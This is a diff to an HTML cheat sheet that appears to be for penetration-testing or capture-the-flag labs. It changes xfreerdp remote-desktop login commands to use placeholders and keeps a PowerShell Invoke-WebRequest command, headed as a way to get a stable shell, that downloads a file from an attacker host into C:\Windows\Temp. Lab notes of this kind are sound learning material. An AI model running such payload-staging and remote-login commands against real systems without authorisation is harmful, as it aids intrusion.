@@ -13,8 +13,8 @@ There is a :
 
 <h2 id='n1'><em>Commands</em></h2> 
 <h3>Remote Desktop Protocol (rdp)</h3>
-  xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:User /p:'Password'
-  <p>xfreerdp /v:10.10.38.213 /u:User /p:Password +clipboard
+  xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;MACHINE_IP> /u:&lt;User> /p:&lt;'Password'>
+  <p>xfreerdp /v:&lt;IP> /u:User /p:Password +clipboard
 	
 <h3>To get stable shell from unstable from PowerShell</h3>
   powershell -c "Invoke-WebRequest -Uri 'http://&lt;IP>:&lt;PORT>/&lt;filename>' -OutFile 'C:\Windows\Temp\&lt;filename>'"
